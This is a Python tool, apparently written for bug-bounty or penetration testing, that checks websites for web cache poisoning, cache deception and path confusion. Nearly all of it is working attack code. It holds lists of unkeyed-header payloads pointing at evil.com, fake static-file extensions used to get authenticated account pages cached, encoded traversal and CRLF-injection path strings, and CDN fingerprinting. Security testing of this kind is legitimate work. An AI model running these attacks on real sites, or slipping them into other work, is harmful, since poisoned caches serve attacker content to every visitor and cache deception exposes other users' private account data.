#!/usr/bin/env python3
"""
cache_poison.py — Web Cache Poisoning + Deception Tester

Tests: cache poisoning via unkeyed headers, web cache deception, path confusion.
CDN-specific behaviors for Cloudflare, Akamai, Fastly, Varnish.

Usage:
    python3 cache_poison.py --url https://target.com/account --auth "Bearer TOKEN"
"""
import json
import hashlib
import os
import random
import string
import time
from pathlib import Path
from urllib.parse import urlparse, urljoin

try:
    import requests
except ImportError:
    requests = None

# ── Unkeyed Headers (cache poisoning vectors) ─────────────────────────────────

POISON_HEADERS = [
    # Host/Origin manipulation
    {"header": "X-Forwarded-Host", "value": "evil.com", "category": "host_override"},
    {"header": "X-Original-URL", "value": "/admin", "category": "path_override"},
    {"header": "X-Rewrite-URL", "value": "/admin", "category": "path_override"},
    {"header": "X-Forwarded-Scheme", "value": "http", "category": "protocol_downgrade"},
    {"header": "X-Forwarded-Proto", "value": "http", "category": "protocol_downgrade"},
    {"header": "X-Host", "value": "evil.com", "category": "host_override"},
    {"header": "X-Forwarded-Server", "value": "evil.com", "category": "host_override"},
    {"header": "X-HTTP-Host-Override", "value": "evil.com", "category": "host_override"},
    {"header": "Forwarded", "value": "host=evil.com", "category": "host_override"},

    # Content injection
    {"header": "X-Forwarded-Prefix", "value": "/evil", "category": "path_prefix"},
    {"header": "X-Original-Url", "value": "https://evil.com/", "category": "redirect_poison"},

    # Cache key manipulation
    {"header": "X-Cache-Key", "value": "evil", "category": "cache_key"},
    {"header": "X-Custom-Cache", "value": "1", "category": "cache_control"},
    {"header": "Pragma", "value": "akamai-x-cache-on", "category": "cache_debug"},
    {"header": "Akamai-Debug", "value": "true", "category": "cache_debug"},
]

# ── Cache Deception Paths ─────────────────────────────────────────────────────

DECEPTION_EXTENSIONS = [
    ".css", ".js", ".png", ".jpg", ".gif", ".ico",
    ".svg", ".woff", ".woff2", ".ttf", ".eot",
    ".map", ".json", ".xml", ".pdf",
]

DECEPTION_PATHS = [
    "/nonexistent.css",
    "/anything.js",
    "/static/x.png",
    "/assets/x.css",
    "%0d%0aX-Injected: true",
]


class CachePoisonTester:
    """Web cache poisoning and deception tester."""

    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        self.cache_buster = ''.join(random.choices(string.ascii_lowercase, k=8))

    def _cache_bust(self, url: str) -> str:
        """Add cache-buster param to avoid hitting real cached pages."""
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}cb={self.cache_buster}{random.randint(1000,9999)}"

    def test_cache_poisoning(self, url: str, auth_headers: dict = None) -> dict:
        """Test for cache poisoning via unkeyed headers."""
        auth_headers = auth_headers or {}
        results = {
            "url": url,
            "type": "CACHE_POISONING",
            "tested": len(POISON_HEADERS),
            "hits": [],
            "poisoned": False,
        }

        # Get baseline response
        busted_url = self._cache_bust(url)
        try:
            baseline = self.session.get(busted_url, headers=auth_headers, timeout=10)
            baseline_body = baseline.text
            baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()
        except Exception:
            return {"url": url, "error": "baseline_failed"}

        for poison in POISON_HEADERS:
            # Use a fresh cache-buster for each test
            test_url = self._cache_bust(url)
            test_headers = dict(auth_headers)
            test_headers[poison["header"]] = poison["value"]

            try:
                # Send poisoned request
                resp1 = self.session.get(test_url, headers=test_headers, timeout=8)
                body1 = resp1.text
                hash1 = hashlib.md5(body1.encode()).hexdigest()

                # Check if response was poisoned (different from baseline)
                poisoned = False
                evidence = []

                # Check if evil.com appears in response (reflected)
                if "evil.com" in body1 and "evil.com" not in baseline_body:
                    poisoned = True
                    evidence.append("evil.com reflected in response")

                # Check if response body changed
                if hash1 != baseline_hash and abs(len(body1) - len(baseline_body)) > 50:
                    evidence.append("response body changed")

                # Check cache headers
                cache_status = resp1.headers.get("X-Cache", resp1.headers.get(
                    "CF-Cache-Status", resp1.headers.get("X-Cache-Status", "")))
                if cache_status:
                    evidence.append(f"cache_status={cache_status}")

                # Now fetch the same URL WITHOUT the poison header — if cached, we win
                time.sleep(0.5)
                resp2 = self.session.get(test_url, headers=auth_headers, timeout=8)
                body2 = resp2.text

                if "evil.com" in body2 and "evil.com" not in baseline_body:
                    poisoned = True
                    evidence.append("POISON CACHED — evil.com in clean request!")

                if poisoned or evidence:
                    hit = {
                        "header": poison["header"],
                        "value": poison["value"],
                        "category": poison["category"],
                        "poisoned": poisoned,
                        "evidence": evidence,
                        "severity": "CRITICAL" if "CACHED" in str(evidence) else
                                   "HIGH" if poisoned else "MEDIUM",
                    }
                    results["hits"].append(hit)
                    if poisoned:
                        results["poisoned"] = True

            except Exception:
                continue

            time.sleep(0.3)

        if results["hits"]:
            results["severity"] = max(
                h["severity"] for h in results["hits"])
            self.findings.append(results)

        return results

    def test_cache_deception(self, url: str, auth_headers: dict = None) -> dict:
        """Test web cache deception — trick CDN into caching authenticated pages.
        
        Attack: /account/settings/nonexistent.css
        If CDN caches this as static content, an unauthenticated user
        can access the cached page and see the victim's account data.
        """
        auth_headers = auth_headers or {}
        results = {
            "url": url,
            "type": "CACHE_DECEPTION",
            "hits": [],
            "vulnerable": False,
        }

        # Get authenticated baseline
        try:
            auth_resp = self.session.get(url, headers=auth_headers, timeout=10)
            auth_body = auth_resp.text
            auth_len = len(auth_body)
        except Exception:
            return {"url": url, "error": "auth_request_failed"}

        for ext in DECEPTION_EXTENSIONS:
            # Append fake extension to authenticated URL
            deception_url = url.rstrip("/") + f"/cached{self.cache_buster}{ext}"

            try:
                # Step 1: Request as authenticated user (seeds the cache)
                resp1 = self.session.get(deception_url, headers=auth_headers, timeout=8)

                if resp1.status_code != 200:
                    continue

                # Check if response looks like the original authenticated page
                if abs(len(resp1.text) - auth_len) > auth_len * 0.5:
                    continue  # Too different, probably a 404 page

                # Step 2: Wait for cache, then request WITHOUT auth
                time.sleep(1)
                unauth_resp = self.session.get(deception_url, timeout=8)

                if unauth_resp.status_code == 200:
                    # Check if cached response contains auth content
                    unauth_body = unauth_resp.text
                    similarity = 0
                    if auth_body and unauth_body:
                        # Simple similarity check
                        auth_words = set(auth_body.split())
                        unauth_words = set(unauth_body.split())
                        if auth_words:
                            similarity = len(auth_words & unauth_words) / len(auth_words)

                    if similarity > 0.7:
                        hit = {
                            "extension": ext,
                            "deception_url": deception_url,
                            "similarity": round(similarity * 100, 1),
                            "auth_body_length": auth_len,
                            "unauth_body_length": len(unauth_body),
                            "cached": True,
                            "severity": "CRITICAL",
                        }
                        results["hits"].append(hit)
                        results["vulnerable"] = True

                        # Check cache headers
                        cache_header = unauth_resp.headers.get(
                            "X-Cache", unauth_resp.headers.get("CF-Cache-Status", ""))
                        if cache_header:
                            hit["cache_status"] = cache_header

            except Exception:
                continue

            time.sleep(0.3)

        if results["vulnerable"]:
            results["severity"] = "CRITICAL"
            self.findings.append(results)

        return results

    def test_path_confusion(self, url: str, auth_headers: dict = None) -> dict:
        """Test path confusion for cache deception.
        
        Uses path traversal + encoding tricks to confuse CDN vs origin.
        CDN sees: /static/main.js (cacheable)
        Origin sees: /api/me (authenticated data)
        """
        auth_headers = auth_headers or {}
        results = {
            "url": url,
            "type": "PATH_CONFUSION",
            "hits": [],
            "vulnerable": False,
        }

        confusion_payloads = [
            "{url}%2F..%2F..%2Fstatic/main.js",
            "{url}/..;/static/main.js",
            "{url}/.%2e/static/main.js",
            "{url}%23.js",
            "{url}%3F.css",
            "{url}/.css",
            "{url};.js",
        ]

        for pattern in confusion_payloads:
            test_url = pattern.format(url=url.rstrip("/"))

            try:
                resp = self.session.get(test_url, headers=auth_headers, timeout=8)

                if resp.status_code == 200 and len(resp.text) > 100:
                    cache_status = resp.headers.get(
                        "X-Cache", resp.headers.get("CF-Cache-Status", ""))

                    if cache_status and "HIT" in cache_status.upper():
                        results["hits"].append({
                            "payload": test_url,
                            "status": resp.status_code,
                            "cache_status": cache_status,
                            "body_length": len(resp.text),
                            "severity": "HIGH",
                        })
                        results["vulnerable"] = True

            except Exception:
                continue

            time.sleep(0.3)

        if results["vulnerable"]:
            self.findings.append(results)

        return results

    def detect_cdn(self, url: str) -> dict:
        """Detect which CDN/cache layer is in front of the target."""
        try:
            resp = self.session.get(url, timeout=8)
            headers = dict(resp.headers)
        except Exception:
            return {"cdn": "unknown"}

        cdn_checks = {
            "cloudflare": ["CF-Ray", "CF-Cache-Status", "cf-request-id"],
            "akamai": ["X-Akamai-Transformed", "Akamai-Real-IP"],
            "fastly": ["X-Fastly-Request-ID", "Fastly-Debug-Digest"],
            "varnish": ["X-Varnish", "Via"],
            "cloudfront": ["X-Amz-Cf-Id", "X-Amz-Cf-Pop"],
            "nginx": ["X-Nginx-Cache-Status"],
        }

        for cdn, header_names in cdn_checks.items():
            for h in header_names:
                if h.lower() in {k.lower() for k in headers}:
                    return {"cdn": cdn, "header": h, "value": headers.get(h, "")}

        server = headers.get("Server", "").lower()
        if "cloudflare" in server:
            return {"cdn": "cloudflare", "source": "server_header"}
        if "akamaighost" in server:
            return {"cdn": "akamai", "source": "server_header"}

        return {"cdn": "unknown"}

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/cache")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"cache_results_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
